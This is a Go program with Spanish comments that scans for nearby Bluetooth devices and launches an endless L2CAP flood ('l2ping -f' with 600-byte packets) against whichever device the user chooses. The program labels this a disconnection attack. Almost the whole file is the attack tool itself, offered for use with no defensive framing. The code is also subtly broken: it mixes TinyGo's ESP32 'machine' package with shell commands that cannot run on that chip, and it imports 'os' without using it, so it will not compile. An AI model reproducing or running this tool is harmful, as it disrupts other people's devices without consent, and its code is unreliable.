package main

import (
	"fmt"
	"machine"
	"os"
	"os/exec"
	"strings"
	"time"
)

// Inicializa el LED en el ESP32
func blinkLED() {
	led := machine.LED
	led.Configure(machine.PinConfig{Mode: machine.PinOutput})
	for i := 0; i < 5; i++ {
		led.High()
		time.Sleep(500 * time.Millisecond)
		led.Low()
		time.Sleep(500 * time.Millisecond)
	}
}

// Verifica si estamos en una Raspberry Pi o un ESP32
func checkDevice() string {
	cmd := exec.Command("uname", "-m")
	output, err := cmd.Output()
	if err != nil {
		fmt.Println("Error al detectar el dispositivo:", err)
		return "Unknown"
	}

	arch := strings.TrimSpace(string(output))
	if strings.Contains(arch, "arm") {
		return "Raspberry Pi"
	} else if strings.Contains(arch, "xtensa") {
		return "ESP32"
	}
	return "Unknown"
}

// Escanea dispositivos Bluetooth cercanos
func scanBluetoothDevices() []string {
	fmt.Println("Escaneando dispositivos Bluetooth...")
	cmd := exec.Command("sudo", "hcitool", "scan")
	output, err := cmd.Output()
	if err != nil {
		fmt.Println("Error al ejecutar escaneo:", err)
		return nil
	}

	var devices []string
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		fields := strings.Fields(line)
		if len(fields) >= 2 && fields[0] != "Scanning" {
			devices = append(devices, fields[0])
			fmt.Printf("Dispositivo encontrado: %s - %s\n", fields[0], strings.Join(fields[1:], " "))
		}
	}
	return devices
}

// Ataque de desconexión usando L2CAP Flood
func deauthBluetooth(target string) {
	fmt.Printf("Iniciando ataque contra %s...\n", target)
	for {
		cmd := exec.Command("sudo", "l2ping", "-i", "hci0", "-s", "600", "-f", target)
		err := cmd.Run()
		if err != nil {
			fmt.Println("Error en ataque:", err)
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
}

func main() {
	device := checkDevice()
	fmt.Println("Ejecutando en:", device)

	if device == "ESP32" {
		go blinkLED()
	}

	if device == "Unknown" {
		fmt.Println("Dispositivo no reconocido. Puede que algunas funciones no sean compatibles.")
	}

	devices := scanBluetoothDevices()
	if len(devices) == 0 {
		fmt.Println("No se encontraron dispositivos Bluetooth.")
		return
	}

	fmt.Println("Selecciona un dispositivo para atacar:")
	for i, device := range devices {
		fmt.Printf("[%d] %s\n", i, device)
	}

	var choice int
	fmt.Print("Ingrese el número del dispositivo: ")
	_, err := fmt.Scan(&choice)
	if err != nil {
		fmt.Println("Error al leer la entrada.")
		return
	}

	if choice >= 0 && choice < len(devices) {
		deauthBluetooth(devices[choice])
	} else {
		fmt.Println("Selección inválida.")
	}
}
